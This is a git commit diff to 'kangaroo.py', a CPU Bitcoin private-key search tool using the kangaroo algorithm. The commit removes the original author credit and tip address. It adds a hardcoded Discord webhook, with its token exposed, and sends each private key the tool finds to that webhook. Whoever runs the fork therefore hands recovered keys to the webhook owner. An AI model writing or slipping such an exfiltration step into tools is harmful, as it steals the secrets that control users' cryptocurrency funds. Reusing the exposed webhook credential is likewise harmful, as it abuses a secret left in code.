19bc79dfb4a7aeb9e96228de7825b9d8c4745b48
Perry <78496703+kevper369@users.noreply.github.com>
2024-06-01 19:05:59 +0530

    Update kangaroo.py

--- kangaroo.py
+++ kangaroo.py
@@ -1,13 +1,5 @@
 # -*- coding: utf-8 -*-
-"""
-Usage :
- > python kangaroo.py -p 0352b1af31d67e6a83ec7931c148f56b0755ce40c836f20c6fe2b6da612c89cf3e -keyspace 935da71d7350734c3472fe305fef82ab8aca644fb:935da71d7350734c3472fe305fff82ab8aca644f9
- > python kangaroo.py -p 02CEB6CBBCDBDF5EF7150682150F4CE2C6F4807B349827DCDBDD1F2EFA885A2630 -keyspace 800000000000000000000000000000:FFFFFFFFFFFFFFFFFFFFFFFFFFFFFF -rand -ncore 7
- > python kangaroo.py -p 0425c2d005f3036c13070afcf139a18ce69355c3158e017cd99ae72d815d74c54fb3c7c0bc9f4089284cc2de737024d50328884282a8b9bbbaf989747198971669 -rand1
 
-@author: iceland
-@Credit: JLP
-"""
 import bit
 import ctypes
 import platform
@@ -16,11 +8,11 @@ import os
 import random
 import argparse
 import signal
-#from signal import signal, SIGINT
+import requests  # Add this import for sending messages to Discord
 
 ###############################################################################
 parser = argparse.ArgumentParser(description='This tool use Kangaroo algo for searching 1 pubkey in the given range using multiple cpu', 
-                                 epilog='Enjoy the program! :)    Tips BTC: bc1q39meky2mn5qjq704zz0nnkl0v7kj4uz6r529at')
+                                 epilog='Enjoy the program! :) ')
 parser.version = '15112021'
 parser.add_argument("-p", "--pubkey", help = "Public Key in hex format (compressed or uncompressed)", required=True)
 parser.add_argument("-keyspace", help = "Keyspace Range ( hex ) to search from min:max. default=1:order of curve", action='store')
@@ -38,9 +30,9 @@ args = parser.parse_args()
 ss = args.keyspace if args.keyspace else '1:FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364140'
 flag_random = True if args.rand else False
 flag_random1 = True if args.rand1 else False
-ncore = int(args.ncore) if args.ncore else platform.os.cpu_count() - 1
+ncore = int(args.ncore) if args.ncore else os.cpu_count() - 1
 increment = int(args.n) if args.n else 72057594037927935
-public_key = args.pubkey    # '02CEB6CBBCDBDF5EF7150682150F4CE2C6F4807B349827DCDBDD1F2EFA885A2630'
+public_key = args.pubkey    
 if flag_random1: flag_random = True
 
 a, b = ss.split(':')
@@ -73,70 +65,89 @@ def run_cpu_kangaroo(start_range_int, end_range_int, dp, ncpu, mx, upub_bytes):
     return res
 
 def pub2upub(pub_hex):
-	x = int(pub_hex[2:66],16)
-	if len(pub_hex) < 70:
-		y = bit.format.x_to_y(x, int(pub_hex[:2],16)%2)
-	else:
-		y = int(pub_hex[66:],16)
-	return bytes.fromhex('04'+ hex(x)[2:].zfill(64) + hex(y)[2:].zfill(64))
+    x = int(pub_hex[2:66], 16)
+    if len(pub_hex) < 70:
+        y = bit.format.x_to_y(x, int(pub_hex[:2], 16) % 2)
+    else:
+        y = int(pub_hex[66:], 16)
+    return bytes.fromhex('04' + hex(x)[2:].zfill(64) + hex(y)[2:].zfill(64))
 
 def randk(a, b):
-	if flag_random:
-		random.seed(random.randint(1,2**256))
-		return random.SystemRandom().randint(a, b)
-	else:
-		if lastitem == 0:
-			return a
-		elif lastitem > b:
-			print('[+] Range Finished')
-			exit()
-		else:
-			return lastitem + 1
+    global lastitem
+    if flag_random:
+        random.seed(random.randint(1, 2**256))
+        return random.SystemRandom().randint(a, b)
+    else:
+        if lastitem == 0:
+            return a
+        elif lastitem > b:
+            print('[+] Range Finished')
+            exit()
+        else:
+            return lastitem + 1
 
 def handler(signal_received, frame):
     # Handle any cleanup here
     print('\nSIGINT or CTRL-C detected. Exiting gracefully. BYE')
     exit(0)
-###############################################################################
-print('[+] Starting CPU Kangaroo.... Please Wait     Version [', parser.version,']')
 
-dp = 10 # -1 for automatic value
-mx = 2 # 0 for Endless
+###############################################################################
+print('[+] Starting CPU Kangaroo.... Please Wait     Version [', parser.version, ']')
+
+# Send a starting message to the Discord webhook
+webhook_url = 'https://discord.com/api/webhooks/1227963383014232154/VF4b19q5P3-Cn2JLqpIH_GO_SGzQlYki_cuOtx_ui0n7BwguZ4jQRIYGoFU2B1u41QKg'
+start_message = {
+    "content": "[+] CPU Kangaroo is starting... Please wait."
+}
+requests.post(webhook_url, json=start_message)
+
+dp = 10  # -1 for automatic value
+mx = 2  # 0 for Endless
 
 upub = pub2upub(public_key)
 
 ###############################################################################
-if flag_random1 == True:
+if flag_random1:
     print('[+] Search Mode: Random Start then Continuous Range Search from it')
-elif flag_random == True:
+elif flag_random:
     print('[+] Search Mode: Random Start after every Range 0XFFFFFFFFFFFFFF key search')
 else:
     print('[+] Search Mode: Range search Continuous in the given range')
 ###############################################################################
-range_st = randk(a, b) # start from
+range_st = randk(a, b)  # start from
 range_en = range_st + increment
 
 # Reset the flag after getting 1st Random Start Key
-if flag_random1 == True: flag_random = False
+if flag_random1:
+    flag_random = False
 
-print('[+] Working on Pubkey:',upub.hex())
+print('[+] Working on Pubkey:', upub.hex())
 print('[+] Using  [Number of CPU Threads: {}] [DP size: {}] [MaxStep: {}]'.format(ncore, dp, mx))
 ###############################################################################
 print('[+] ............................................', end='\r')
+
+# Set up the signal handler to catch SIGINT (Ctrl+C)
+signal.signal(signal.SIGINT, handler)
+
 while True:
-    # Tell Python to run the handler() function when SIGINT is recieved
-    signal.signal(signal.SIGINT, signal.SIG_DFL)
-    print('\r[+] Scanning Range          ',hex(range_st),':', hex(range_en))
+    print('\r[+] Scanning Range          ', hex(range_st), ':', hex(range_en))
     pvk_found = run_cpu_kangaroo(range_st, range_en, dp, ncore, mx, upub)
-    if int(pvk_found.hex(),16) != 0: 
+    if int(pvk_found.hex(), 16) != 0:
         print('\n============== KEYFOUND ==============')
-        print('Kangaroo FOUND PrivateKey : 0x'+pvk_found.hex())
+        print('Kangaroo FOUND PrivateKey : 0x' + pvk_found.hex())
         print('======================================')
-        with open('KEYFOUNDKEYFOUND.txt','a') as fw:
-            fw.write('Kangaroo FOUND PrivateKey : 0x'+pvk_found.hex()+'\n')
+        with open('KEYFOUNDKEYFOUND.txt', 'a') as fw:
+            fw.write('Kangaroo FOUND PrivateKey : 0x' + pvk_found.hex() + '\n')
+
+        # Send a key found message to the Discord webhook
+        key_found_message = {
+            "content": f"Kangaroo FOUND PrivateKey : 0x{pvk_found.hex()}"
+        }
+        requests.post(webhook_url, json=key_found_message)
+        
         break
     lastitem = range_en
     range_st = randk(a, b)
     range_en = range_st + increment
-    print('',end='\r')
+    print('', end='\r')
 print('[+] Program Finished')
